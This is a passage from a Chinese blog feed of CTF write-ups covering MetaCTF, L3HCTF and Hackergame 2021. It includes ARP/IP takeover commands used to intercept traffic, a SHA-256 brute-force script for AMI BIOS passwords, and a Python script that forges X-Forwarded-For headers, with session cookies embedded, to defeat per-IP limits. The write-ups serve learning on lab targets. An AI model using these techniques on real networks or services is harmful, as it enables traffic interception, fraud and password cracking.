    <content type="html"><![CDATA[<!--什么黑历史合集--><!--## 比赛情况--><!--- 比赛时间（UTC-8）：2021-12-04 04:00:00 ~ 2021-12-06 04:00:00，共计 48 h--><!--- 比赛模式：解题模式（静态分值，无一血奖励）--><!--- 队伍总分：8575--><!--- 队伍排名：被 ban 了有个锤子排名--><!--- 贡献分数：1325--><!----><!--## 前言与吐槽--><!--“是的，我是烂分，你恰到我了，但是你的线代却寄了个透彻。这一切，值得吗？”--><!----><!--这次打的比赛貌似是从 CTFTime 上选的国外比赛，感觉上好像是是什么入门级别的比赛？--><!--秉持着奇怪的优良传统，我还是只写了 Misc 部分。--><!--只不过国外对 Misc 好像确实有细分，这次比赛就把 Misc 分了三块：--><!--- Forehsics（数字取证）--><!--- Reconnaissance（信息搜集）--><!--- Other（其他）--><!----><!--只能说，我真的怀疑有的题水的程度了啊，有的中等分值的题目比 Hackergame 还水。--><!--不过该不会写的题目还是不会写，比如万恶的社工题（卑微）--><!--反正我的水平好像也就只能恰恰烂分了……--><!----><!--虽然我的周末又报销了，不过还是学到了一点东西的。--><!--而且能感觉到，国外 CTF 的风格貌似跟国内还是有很大不同的。--><h2 id="解出的题目"><a href="#解出的题目" class="headerlink" title="解出的题目"></a>解出的题目</h2><h3 id="Interception-I-100-pts-Other"><a href="#Interception-I-100-pts-Other" class="headerlink" title="Interception I (100 pts) (Other)"></a>Interception I (100 pts) (Other)</h3><blockquote><p>192.168.0.1 is periodically (once every 4 seconds) sending the flag to 192.168.0.2 over UDP port 8000. Go get it.<br>ssh <a href="mailto:&#99;&#116;&#x66;&#45;&#49;&#x40;&#104;&#x6f;&#x73;&#116;&#x2e;&#99;&#x67;&#50;&#x31;&#x2e;&#x6d;&#101;&#116;&#x61;&#x70;&#x72;&#x6f;&#x62;&#x6c;&#101;&#109;&#115;&#x2e;&#x63;&#111;&#x6d;">&#99;&#116;&#x66;&#45;&#49;&#x40;&#104;&#x6f;&#x73;&#116;&#x2e;&#99;&#x67;&#50;&#x31;&#x2e;&#x6d;&#101;&#116;&#x61;&#x70;&#x72;&#x6f;&#x62;&#x6c;&#101;&#109;&#115;&#x2e;&#x63;&#111;&#x6d;</a> -p 7000</p></blockquote><p>ssh 连接到对面主机，给了一个 BusyBox 环境。</p><p>可以去 /usr/bin 和 /usr/sbin 下看看有什么能用的网络工具，发现了这些玩意：</p><ul><li>ifconfig</li><li>netstat</li><li>nc</li><li>nmap</li><li>tcpdump</li><li>telnet</li><li>arping</li></ul><p>根据题意，考虑通过 ARP 欺骗，顶替 192.168.0.2，从而获取数据包。在终端下运行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.0.2 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p>然后 ping 一下网关，更新一下 ARP 映射表，nc 监听 8000/udp 即可获取 flag。<br><br></p><h3 id="Interception-II-150-pts-Other"><a href="#Interception-II-150-pts-Other" class="headerlink" title="Interception II (150 pts) (Other)"></a>Interception II (150 pts) (Other)</h3><blockquote><p>Someone on this network is periodically sending the flag to … someone else on this network, over TCP port 8000. Go get it.<br>ssh <a href="mailto:&#99;&#x74;&#102;&#x2d;&#52;&#x36;&#x65;&#100;&#51;&#53;&#x35;&#x39;&#x64;&#97;&#48;&#56;&#x40;&#x68;&#111;&#x73;&#x74;&#46;&#99;&#x67;&#x32;&#49;&#46;&#109;&#x65;&#116;&#97;&#x70;&#x72;&#x6f;&#x62;&#x6c;&#101;&#x6d;&#x73;&#46;&#x63;&#111;&#x6d;">&#99;&#x74;&#102;&#x2d;&#52;&#x36;&#x65;&#100;&#51;&#53;&#x35;&#x39;&#x64;&#97;&#48;&#56;&#x40;&#x68;&#111;&#x73;&#x74;&#46;&#99;&#x67;&#x32;&#49;&#46;&#109;&#x65;&#116;&#97;&#x70;&#x72;&#x6f;&#x62;&#x6c;&#101;&#x6d;&#x73;&#46;&#x63;&#111;&#x6d;</a> -p 7000</p></blockquote><p>我们的目标和 Interception I 相同，但这次我们不知道 src 和 dst IP 了。</p><p>知道端口号，还有 nmap，考虑扫描整个网段内的所有 IP 地址，获取存活主机的信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 8000 192.168.0.0-255</span><br></pre></td></tr></table></figure><p>扫出来只有 192.168.0.78 的 TCP 8000 端口开着，和上面一题一样，直接把它挤掉。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.0.78 netmask 255.255.255.0</span><br><span class="line">nmap -p 8000 192.168.0.0-255</span><br></pre></td></tr></table></figure><p>用 nc 监听自己的 8000/tcp 即可获得 flag。</p><h3 id="Easy-as-it-TCP-Streams-250-pts-Forensics"><a href="#Easy-as-it-TCP-Streams-250-pts-Forensics" class="headerlink" title="Easy as it (TCP) Streams (250 pts) (Forensics)"></a>Easy as it (TCP) Streams (250 pts) (Forensics)</h3><blockquote><p>Caleb was designing a problem for MetaCTF where the flag would be in the telnet plaintext. Unfortunately, he accidentally stopped the packet capture right before the flag was supposed to be revealed. Can you still find the flag? Note: You’ll need to decrypt in CyberChef rather than using a command line utility. </p></blockquote><p>下载下来一个 pcap 文件，用 Wireshark 打开，按照套路，先追踪一下 TCP 流。</p><p><img src="/images/blog05/T3-1.png" alt="流 0" title="流 0"><br><img src="/images/blog05/T3-2.png" alt="流 1" title="流 1"><br><img src="/images/blog05/T3-3.png" alt="流 2" title="流 2"></p><p>看起来主机用 gpg 加密了一个文件，流 0 有 PGP Message，流 1 有 PGP Private Key，流 2 有 passphrase。扔到 CyberChef 里可以一把梭。</p><h3 id="Pattern-of-Life-275-pts-Forensics"><a href="#Pattern-of-Life-275-pts-Forensics" class="headerlink" title="Pattern of Life (275 pts) (Forensics)"></a>Pattern of Life (275 pts) (Forensics)</h3><blockquote><p>Hackers have breached our network. We know they are there, hiding in the shadows as users continue to browse the web like normal. As a threat hunter, your job is to constantly be searching our environment for any signs of malicious behavior.</p><p>Today you just received a packet capture (pcap) from a user’s workstation. We think that an attacker may have compromised the user’s machine and that the computer is beaconing out to their command and control (C2) server. Based on some other logs, we also think the attacker was <em>not</em> using a fully encrypted protocol and also did not put much care into making their C2 server look like a normal website. Your task? We’d like you to submit the port number that the C2 server is listening on in the form of MetaCTF{portnumber} as the flag.</p></blockquote><p>下载下来一个 pcap 文件，用 Wireshark 打开。题目要求是找到本机被监听的端口，给的提示有两个：</p><ul><li>用的不是加密协议</li><li>看起来很可疑（异常流量？）</li></ul><p>流太多了，显然不能直接看。想到这个用户可能在疯狂浏览网页，而现在 HTTPS 在国外覆盖率很高，不妨把 443 端口直接无视掉？</p><p>结果喜人，流量一下少了一大半，从上往下翻，发现本机的 8080 端口十分可疑，从头到尾都在疯狂地与对面主机的 49694 端口你来我往。答案也正是 8080。</p><h3 id="I-want-my-files-back-275-pts-Reconnaissance"><a href="#I-want-my-files-back-275-pts-Reconnaissance" class="headerlink" title="I want my files back (275 pts) (Reconnaissance)"></a>I want my files back (275 pts) (Reconnaissance)</h3><blockquote><p>While the world continues to battle COVID-19, the digital world continues to battle its own epidemic - ransomware. Criminals continue to hold organizations’ files hostage as they cast a wide net hacking anyone with a vulnerable device or through phishing.</p><p>Fortunately criminals aren’t always the sharpest tool in the shed, and sometimes it’s possible to decrypt a ransomwared file without paying the ransom. We’ve come across one such file - perhaps you can figure out what Ransomware strain encrypted it and a way to decrypt it?</p><p>There have been problems with downloading the entire file on Firefox, the md5sum of the file is 32cbeca49de4e1b297550f4ae95a39b6</p></blockquote><p>下载附件，给了一个被勒索文件加密的 png 文件，要求是解密。</p><ul><li>文件名有 [AA4-MX4-GGQD] 字样</li><li>010 Editor 打开，看到末尾有 GotAllDone 字样</li></ul><p>谷歌可知，勒索软件叫做 Prometheus。</p><p>GitHub 找到一个可以解密这玩意的 Python 脚本，功能貌似还挺强大，支持 GUI，支持通过特征字节缩小密码范围。<br><a href="https://github.com/cycraft-corp/Prometheus-Decryptor">https://github.com/cycraft-corp/Prometheus-Decryptor</a></p><p>下载、爆破，打开图片就是 flag。</p><h3 id="The-Searcher-275-pts-Reconnaissance"><a href="#The-Searcher-275-pts-Reconnaissance" class="headerlink" title="The Searcher (275 pts) (Reconnaissance)"></a>The Searcher (275 pts) (Reconnaissance)</h3><blockquote><p>Alright analyst. We need your help with some investigative work as we dive deeper into one of the infections on our company’s network. We’ve taken a small packet capture that we know contains some C2 traffic. In order to give us some more leads for the investigation though, we’d like to see if we can identify what C2 framework the attacker was using. This will give us some leads into potential host-based artifacts that might be left behind.</p><p>Please submit the name of the C2 Framework being used in the form of MetaCTF{c2frameworkname}</p></blockquote><p>又双叒下载下来一个 pcap 文件，用 Wireshark 打开。</p><p>追踪流可以看到几个有意思的东西，其中最有意思的当属这个。</p><p><img src="/images/blog05/T6-1.png" alt="ASP" title="ASP"></p><p>ASP.NET？<br>Google 搜索 C2 Framework ASP.NET 可以搜到 Covenant，交上去就是 flag。</p><h2 id="未解出的题目"><a href="#未解出的题目" class="headerlink" title="未解出的题目"></a>未解出的题目</h2><h3 id="Interception-III-275-pts-Other"><a href="#Interception-III-275-pts-Other" class="headerlink" title="Interception III (275 pts) (Other)"></a>Interception III (275 pts) (Other)</h3><p><del>当时不懂路由（</del></p><p>进入环境之后，telnet 本地网关，在 enp0s0 设备上再加一个目标 IP 实现 ARP 欺骗。<br>然后 nc 监听自己的 8000/udp 即可获得 flag。</p><h3 id="Mystery-C2-Server-350-pts-Reconnaissance"><a href="#Mystery-C2-Server-350-pts-Reconnaissance" class="headerlink" title="Mystery C2 Server (350 pts) (Reconnaissance)"></a>Mystery C2 Server (350 pts) (Reconnaissance)</h3><p>To do…</p><h3 id="The-Carver-475-pts-Forensics"><a href="#The-Carver-475-pts-Forensics" class="headerlink" title="The Carver (475 pts) (Forensics)"></a>The Carver (475 pts) (Forensics)</h3><p>To do…</p><h3 id="Where’s-Vedder-525-pts-Reconnaissance"><a href="#Where’s-Vedder-525-pts-Reconnaissance" class="headerlink" title="Where’s Vedder? (525 pts) (Reconnaissance)"></a>Where’s Vedder? (525 pts) (Reconnaissance)</h3><p>Vedder 三部曲的第一部，分值高得吓人。<br>翻了题解，实在没看出来那个房子是 Funeral House……<br>这就是文化差异吗？</p><p>知道是 Funeral House 之后，全州筛查「在公共森林中心的 Funeral House」即可。</p><h3 id="Online-Presence-550-pts-Reconnaissance"><a href="#Online-Presence-550-pts-Reconnaissance" class="headerlink" title="Online Presence (550 pts) (Reconnaissance)"></a>Online Presence (550 pts) (Reconnaissance)</h3><p>To do…</p><h3 id="They-call-me-TracerT-550-pts-Reconnaissance"><a href="#They-call-me-TracerT-550-pts-Reconnaissance" class="headerlink" title="They call me TracerT (550 pts) (Reconnaissance)"></a>They call me TracerT (550 pts) (Reconnaissance)</h3><p>To do…</p><h3 id="New-Spot-600-pts-Reconnaissance"><a href="#New-Spot-600-pts-Reconnaissance" class="headerlink" title="New Spot (600 pts) (Reconnaissance)"></a>New Spot (600 pts) (Reconnaissance)</h3><p>To do…</p><h3 id="Step-into-the-NET-600-pts-Other"><a href="#Step-into-the-NET-600-pts-Other" class="headerlink" title="Step into the NET (600 pts) (Other)"></a>Step into the NET (600 pts) (Other)</h3><p>To do…</p><p>按照题目描述来看，是道综合型的取证分析题目。</p>]]></content>
    
    
    <summary type="html">“是的，我是烂分，你恰到我了，但是你的线代却寄了个透彻。这一切，值得吗？”</summary>
    
    
    
    
    <category term="CTF" scheme="http://crabtux.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>L3HCTF 留档</title>
    <link href="http://crabtux.github.io/2021/11/24/L3HCTF-%E7%95%99%E6%A1%A3/"/>
    <id>http://crabtux.github.io/2021/11/24/L3HCTF-%E7%95%99%E6%A1%A3/</id>
    <published>2021-11-24T13:17:23.000Z</published>
    <updated>2021-11-24T13:17:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="比赛情况"><a href="#比赛情况" class="headerlink" title="比赛情况"></a>比赛情况</h2><ul><li>比赛时间（UTC-8）：2021-11-13 09:00:00 ~ 2021-11-15 09:00:00，共计 48 h</li><li>比赛模式：解题模式（动态分值，无一血奖励）</li><li>队伍总分：6016</li><li>队伍排名：7</li><li>贡献分数：0</li></ul><h2 id="前言与吐槽"><a href="#前言与吐槽" class="headerlink" title="前言与吐槽"></a>前言与吐槽</h2><p>第一次打正儿八经的 CTF，因为 Misc 方向没人做所以想去试试。</p><p><del>其实就是我啥都不会还想凑热闹而已</del></p><p>不过很遗憾，从各个队伍的解题情况来看，这次 Misc 除了签到题就没有什么能写的题目。</p><p>我只看了一道题目 BootFlag，从 13 号上午 10 点一直看到 14 号晚上睡觉。中途善良的 cwz 大爷前来支援，给了我巨大的精神激励。结果还是没写出来。长达 3 页半的 Google 文档生动形象地展示了我当时有多么发狂。</p><p>不过这道题难度确实不低，貌似到比赛结束为止，这道题也就只有 5 个队伍解出来。</p><p>（然而其他 Misc 更是重量级……）</p><p>当然，如果是那种一点希望都没有的 “做不出来”，那我就不会在这里写留档了对吧？实际上我们离完全解出题目已经不远了，思路基本上是对的，但是细节上出了一些问题。正因如此，我才想写下这篇留档，总结经验，吸取教训，争取下次<del>还寄</del>能写出一题。</p><h2 id="未解出的题目"><a href="#未解出的题目" class="headerlink" title="未解出的题目"></a>未解出的题目</h2><h3 id="BootFlag"><a href="#BootFlag" class="headerlink" title="BootFlag"></a>BootFlag</h3><p>附件给了一个压缩包，拉下来解压缩之后发现里面装了一个视频和一个 bin 文件。bin 文件是 AMI Aptio UEFI 固件，视频是密码设置的全过程录屏。</p><p>题目要求是，提取 BIOS 中的 Administration Password 和 User Password。</p><p>从视频中可以看出，两个密码都只有四位，而且题目也给了密码的取值范围，很明显是想让我们爆破。</p><p>一开始我想的是，直接通过虚拟机一类的东西加载 BIOS 固件，然后想办法自动化爆破，然而缺乏经验的我连用虚拟机加载 BIOS 这一步都无法完成，只好作罢。</p><p>而且后来才想起来，密码还是有 1M+ 种情况的，这么爆破还是不现实。</p><p>那就只能求助谷歌娘了，Google 搜索 AMI BIOS Password Recovery，可以找到如下链接：<a href="https://gist.github.com/en4rab/550880c099b5194fbbf3039e3c8ab6fd">https://gist.github.com/en4rab/550880c099b5194fbbf3039e3c8ab6fd</a></p><p>文章的作者使用了 UEFITool 这一工具，提取了固件中存储于 AMITSESetup 模块的密文，并使用异或解密成功恢复了明文。</p><p>然而，当我们满心欢喜地敲开 BIOS 的脑壳（在 follow 上述文章的步骤前，请注意你的 UEFITool 的版本，我在这里吃了亏），提取密文，试图用同样的方法获取明文时，却明显地发现了不对劲。</p><p>首先，我们提取出的密文长度与文章中的密文长度不一致。具体来说，在忽略掉末尾的 0 之后，我们提取出的密文长度为 256 bits，而文章中的密文长度却是 512 bits。</p><p>其次，对我们获取的密文尝试进行异或解密遭到了失败。这就说明，我们手中的密文使用了另外的加密方式。</p><p>在没有提示的情况下，我们也可以猜测其加密方式。256 bits 的密文长度很有代表性。更重要的是，题目的意思很明显是让我们爆破密码。综合上述两点，最有可能符合要求的加密方式就是 SHA-256 了。</p><p>然而，现在的问题在于，经过 cwz 大爷和我的尝试，直接对明文字符串用 Python 进行 SHA-256 的爆破是没有结果的。</p><p>我想到，会不会是对面的 SHA-256 加密方式有一些奇奇怪怪的变动，从而能够适应固件的需求呢？可如果真是这样，我们又如何知道他们到底是如何进行 SHA-256 的加密呢？</p><p>两个办法，一个办法是，用 UEFITool 把负责密码的模块 AMITSE 提取出来，交给 Reverse 大佬逆掉。这就是我为什么前面说后悔没去活动室找彪哥抱大腿的原因（虽然其实我当时也没想到把固件模块直接逆掉）</p><p>当然还有一个办法，不过要结合提示来看，自己想起来还是比较困难的。在我搜索 AMI BIOS Password Recovery 的过程中，我注意到，有一个网站提到，Aptio 的源代码曾经遭到过泄露，但当时我没有在意。</p><p>然而，提示出来之后，我在 Github 上乱逛的时候，意外发现了 Aptio 泄露的源代码，正好对应了提示信息中的 Github leak。</p><p>当时好像已经是 14 号下午了，我欣喜若狂，心说我这他妈不是稳了吗？！</p><p>然后我就在这里寄了。官方 WP 里一句轻描淡写的 “仔细阅读源码” 就给我干碎了。</p><p>我的爆破代码漏了两个东西。</p><p>一个是 UTF-16 的编码。这玩意是不兼容 ASCII 编码的，我当时还在想为啥 Password 要用 UINT16，而不是 UINT8 来存储。<br>一个是将明文的二进制表示用 0 补全到 40 字节。<br>考虑到这两个因素之后，官方的 WP 的爆破代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">hash1 = (<span class="string">&quot;c0470b97efc32108a06fe1b695b447c845f78d90438f43f1e2bed18a5af4e704&quot;</span>)</span><br><span class="line">hash2 = (<span class="string">&quot;ab1e1a0f2127221775bc850312da0ba81e55a13e0c08f144382b6b11c8890494&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(string.digits+string.ascii_letters, <span class="number">4</span>):</span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    p = <span class="built_in">str</span>.encode(p, <span class="string">&#x27;utf-16&#x27;</span>)[<span class="number">2</span>:]</span><br><span class="line">    p = p.ljust(<span class="number">40</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(p).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == hash1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hash1:&quot;</span>, <span class="string">&#x27;&#x27;</span>.join(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == hash2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hash2:&quot;</span>, <span class="string">&#x27;&#x27;</span>.join(i))</span><br></pre></td></tr></table></figure><p>运行脚本即可获得两个密码，从而解出 flag。</p>]]></content>
    
    
    <summary type="html">爆零了。我还是太菜了。</summary>
    
    
    
    
    <category term="CTF" scheme="http://crabtux.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame 2021——杂谈与 WP</title>
    <link href="http://crabtux.github.io/2021/10/31/Hackergame-2021-WP%E4%B8%8E%E6%9D%82%E8%B0%88/"/>
    <id>http://crabtux.github.io/2021/10/31/Hackergame-2021-WP%E4%B8%8E%E6%9D%82%E8%B0%88/</id>
    <published>2021-10-31T14:21:35.000Z</published>
    <updated>2021-10-31T14:21:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="比赛情况"><a href="#比赛情况" class="headerlink" title="比赛情况"></a>比赛情况</h2><ul><li>赛时 ID：<strong>呜呜呜 #MUSTC科大音游小栈 群号 44834360</strong></li><li>校内排名：19</li><li>总排名：91</li><li>总分：2400</li><li>Binary：300</li><li>General：1000</li><li>Math：200</li><li>Web：900</li></ul><h2 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h2><p>其实我对 Hackergame 这个比赛早有耳闻，似乎是在网上冲浪的时候偶然翻到的吧。<br>至于这个 “早有耳闻” 的 “早” 具体有多早嘛……我已经忘了，反正肯定是进校之前的事情。<br>别人的情况我不太清楚，反正我对这次比赛还是挺上心的。<br>本来打算赛前多看看我那本 CSAPP 补补课的，无奈开学之后手头事情实在不少，看书这事也就直接被我丢到爪哇国去了。</p><p>虽然赛时，我的生活习惯不允许我像某些 dalao 一样熬夜甚至通宵（听说甚至还有连续熬夜的……Orz），但在这一个星期之内，我基本也处于半脱产状态。<br>课是没怎么听，甚至在星期四的线代课上掏出笔记本看题，作业也基本只能维持在刚好完成的水平线上。</p><p>不过最后的排名貌似还行？大概是总榜 91，校内 19 的排名，说高也不高说低也不算低，但也基本上能代表我目前的最高水平了。<br>我在本次比赛中也学到了不少东西，比如对网站的架构有了更深刻的理解，以及对诸如 LUKS 这样的小玩意有了一些了解。<br>同时也认识到自己的很多不足。<del>比如 Python 都不会用</del><br>赛后翻翻其他 dalao 的题解，也有比较亮眼、值得借鉴的思路和实用的工具。<br>娘的，在我高中的那个四线城市，我可没这个机会（和时间）研究这些东西啊。</p><p>在此感谢 Hackergame 的全体工作人员，为我们年轻人献上了一场高质量的比赛。<br>卷子质量很好，老师服务态度很好，明年还来（大概）。</p><p>姑且把赛后写的 WP 搬到这边来吧，顺便修修 BUG，也整理一下措辞，作为归档。</p><h2 id="没什么参考价值而且还在吐槽的-WP-部分"><a href="#没什么参考价值而且还在吐槽的-WP-部分" class="headerlink" title="没什么参考价值而且还在吐槽的 WP 部分"></a>没什么参考价值<del>而且还在吐槽</del>的 WP 部分</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>进入网页，观察到传递的参数是 UNIX 时间戳，随便算算就行。</p><h3 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h3><p>网页识图把十六进制字符搞出来，扔进 010 Editor 直接看就行。</p><h3 id="去吧！追寻自由的电波！"><a href="#去吧！追寻自由的电波！" class="headerlink" title="去吧！追寻自由的电波！"></a>去吧！追寻自由的电波！</h3><p>用 Audacity 降速会顺带改变它的音调，这正是我们想要的结果。</p><h3 id="猫咪问答-Pro-Max"><a href="#猫咪问答-Pro-Max" class="headerlink" title="猫咪问答 Pro Max"></a>猫咪问答 Pro Max</h3><p>T1：Wayback Machine<br>T3：USTC LUG 官网，活动室搬迁的文章<br>T2、T4、T5：Google</p><h3 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h3><p>利用整型溢出，把秤上的重量调到 “与 20 的距离恰好被 3 整除的负数”，然后再往上加即可。</p><p>核心要义是通过溢出，改变 “秤上的重量” 的剩余系。</p><h3 id="透明的文件"><a href="#透明的文件" class="headerlink" title="透明的文件"></a>透明的文件</h3><p>正好之前配置 Linux 的 PS1 的时候搞过一点点，对着 ANSI Escape code 的格式改就行。</p><h3 id="旅行照片"><a href="#旅行照片" class="headerlink" title="旅行照片"></a>旅行照片</h3><p>蓝色的 KFC 是突破口。</p><p>百度搜索 “海边的 KFC” 就能够获得店铺信息了，从而解出 T4 和 T5。<br>T1、T2 是常识，T3 我没法确定，只能爆破。<br>T3 的官方题解是利用了水平面，呜呜呜我不就是没有常识吗呜呜呜</p><h3 id="FLAG-助力大红包"><a href="#FLAG-助力大红包" class="headerlink" title="FLAG 助力大红包"></a>FLAG 助力大红包</h3><p>前后端识别指的是：</p><ul><li>前端调用搜狐 API 获取本机 IP 地址，并在点击链接的时候通过传参数的方式传递给后端</li><li>后端通过某些玄学方法（草我也不懂，可能跟包的传输有关）获取源 IP 地址</li><li>前后端获得的 IP 地址进行比较，判断是否助力成功</li></ul><p>我的解决方案是用 Python 发送 POST 请求，只需要：</p><ul><li>在请求头加一个 XFF 头，伪造一个 IP 地址丢进去</li><li>传参的时候把 IP 地址改成和 XFF 头一样的 IP 地址</li></ul><p>按照以上步骤，即可从任意 IP 地址完成助力。</p><p>注意到活动规则中提到：</p><blockquote><p>每个用户只能够助力一次。为了建设世界一流大砍刀平台，活动要求位于同一 /8 网段的用户将会被视为同一个用户。（比如 IP 地址为 202.38.64.1 和 202.39.64.1 将被视为同一用户。）达到助力次数上限后，将无法再帮助好友助力。</p></blockquote><p>那就把不同 /8 网段的 IP 地址全跑一遍好了，共计 256 个 IP 地址，跑完才能拿到 flag。<br>其他题解有用 Shell Script + curl 的组合的，可惜我才疏学浅不懂 Shell Script。</p><p>附上代码（Python）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://202.38.93.111:10888&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DNT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://202.38.93.111:10888/invite/ba9ebe2b-351d-4c65-8391-db325c13d17b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;eyJ0b2tlbiI6IjEyNjc6TUVVQ0lRQy9mMnFNTUo0Q1dDOXg0N1YvYzdoazAvNDFoQVduSVJvcWNUK0JhUTNUM3dJZ0xONXU1VFRzUHdwQlVKdnBab2NFWFg0UzAySnQ4d09DYy92c3lmUWl3T2c9In0:1me8d6:itN3T7cxY5fL7Vdr6-aaFZmLjW65C_G3N1_k-G6saTU; csrftoken=kGaFCfhHsJPCfSZh2VbRRFyeuqz2b0JNSb9JBkqmZT3raIG7npoMUXVsPxtZIhf7; PHPSESSID=0dc4fb11c21c083de000de7053b20372; session=eyJ0b2tlbiI6IjEyNjc6TUVVQ0lRQy9mMnFNTUo0Q1dDOXg0N1YvYzdoazAvNDFoQVduSVJvcWNUK0JhUTNUM3dJZ0xONXU1VFRzUHdwQlVKdnBab2NFWFg0UzAySnQ4d09DYy92c3lmUWl3T2c9In0.YXPlRA.Dg66QXWVfHaUhTOAzWOYhLUXqkw&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">urls = <span class="string">&#x27;http://202.38.93.111:10888/invite/ba9ebe2b-351d-4c65-8391-db325c13d17b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    header[<span class="string">&#x27;X-Forwarded-For&#x27;</span>] = <span class="built_in">str</span>(i) + <span class="string">&#x27;.222.233.233&#x27;</span></span><br><span class="line">    datas = &#123;<span class="string">&quot;ip&quot;</span>: <span class="built_in">str</span>(i)+<span class="string">&#x27;.222.233.233&#x27;</span>&#125;</span><br><span class="line">    res = requests.post(headers=header, url=urls, data=datas)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="Amnesia"><a href="#Amnesia" class="headerlink" title="Amnesia"></a>Amnesia</h3><h4 id="轻度失忆"><a href="#轻度失忆" class="headerlink" title="轻度失忆"></a>轻度失忆</h4><p>懒得查资料了，盲猜要使得程序内不出现字符串常量。<br>我定义了一个字符变量，对它的值不断进行修改，并使用 putchar 输出，就过掉了。</p><h3 id="图之上的信息"><a href="#图之上的信息" class="headerlink" title="图之上的信息"></a>图之上的信息</h3><p>Google 一下 GraphQL Hack 就能知道如何利用 GraphQL 提供的 API 获得所有能够查询的参数。<br>找找看怎么查询 private email，传参查询即可。</p><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h3><p>显然，这是一道数论题。<br>求 P 要用到 Wilson 定理的推论和乘法逆元。<br>求 Q 和最终的 data 要用到离散对数（或者说是欧拉函数的性质？）和乘法逆元。<br>我个人写这种脚本的习惯是不同功能分开写，这样便于我理清思路，所以文件数量比较多，代码又臭又长，甚至还有重复。</p><p>求 P 的代码（Python）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span 